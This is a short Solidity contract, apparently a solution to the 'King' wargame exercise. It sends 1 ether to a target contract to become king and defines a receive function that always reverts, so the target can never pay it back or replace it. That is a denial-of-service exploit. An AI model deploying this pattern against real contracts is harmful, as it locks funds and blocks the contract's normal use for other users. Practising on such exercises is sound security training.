// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    receive() external payable {
        require(false);
    }

    function hackContract() external {
        // Code me!
        (bool success, ) = payable(contractAddress).call{value: 1 ether}("");
    }
}
